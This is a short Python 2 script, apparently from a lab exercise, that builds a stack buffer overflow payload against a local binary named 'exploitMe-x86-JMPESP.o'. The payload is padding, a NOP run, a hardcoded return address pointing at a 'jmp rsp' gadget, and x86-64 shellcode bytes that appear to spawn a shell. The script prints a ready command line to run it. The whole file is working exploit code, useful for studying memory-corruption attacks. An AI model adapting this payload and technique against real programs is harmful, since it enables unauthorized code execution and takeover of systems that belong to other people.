import os


# 96 is the distance to the return address
#Ret address must be overwritten by address of JMP ESP

buf="AAAA"
buf+="\\x90"*84

exeName="exploitMe-x86-JMPESP.o"


#return address (address of jmp esp)
buf+="\\xd5\\x50\\xfd\\xf7\\xff\\x7f\\x00\\x00"

#shellcode
buf+="\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"

#once the return address is loaded into the rip, (after ret), the stack moves to the next address
#if ret addr points to jmp esp or call esp instruction , the bytes after ret will be loaded into RIP
#\x7f \xff \xf7 \xfd \x50 \xd5: jmp rsp






exploitString="./"+exeName+" $(python -c \"print\'"+str(buf)+"\'\")"

print exploitString
